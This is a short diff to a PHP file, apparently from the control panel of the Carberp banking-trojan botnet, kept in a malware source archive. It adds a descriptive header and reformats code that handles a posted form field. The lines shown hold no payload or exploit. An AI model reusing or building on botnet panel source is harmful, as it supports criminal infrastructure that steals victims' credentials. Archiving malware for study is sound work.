@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 if($Cur['type'] == 1){
@@ -17,9 +28,11 @@ if(!empty($Cur['id'])){
 if(isset($_POST['add'])){
 	@array_walk($_POST, 'real_escape_string');
 
-	if($_POST['data'] != '*'){		if(($_POST['data'][0] . $_POST['data'][1] . $_POST['data'][2]) == ($_POST['data'][3] . $_POST['data'][4] . $_POST['data'][5])){
+	if($_POST['data'] != '*'){
+		if(($_POST['data'][0] . $_POST['data'][1] . $_POST['data'][2]) == ($_POST['data'][3] . $_POST['data'][4] . $_POST['data'][5])){
 			$_POST['data'] = $_POST['data'][0] . '.' . $_POST['data'][1] . '.' . $_POST['data'][2];
-		}else{			$_POST['data'] = $_POST['data'][0] . '.' . $_POST['data'][1] . '.' . $_POST['data'][2] . '-' . $_POST['data'][3] . '.' . $_POST['data'][4] . '.' . $_POST['data'][5];
+		}else{
+			$_POST['data'] = $_POST['data'][0] . '.' . $_POST['data'][1] . '.' . $_POST['data'][2] . '-' . $_POST['data'][3] . '.' . $_POST['data'][4] . '.' . $_POST['data'][5];
 		}
 	}
 
